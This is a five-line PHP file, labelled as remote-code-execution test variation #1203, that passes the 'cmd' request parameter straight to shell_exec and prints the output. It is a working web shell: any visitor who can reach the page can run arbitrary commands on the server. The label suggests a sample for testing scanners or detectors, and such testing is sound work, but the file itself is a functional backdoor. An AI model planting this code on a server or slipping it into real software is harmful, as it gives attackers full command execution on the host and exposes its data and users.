<?php
// RCE test variation #1203
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>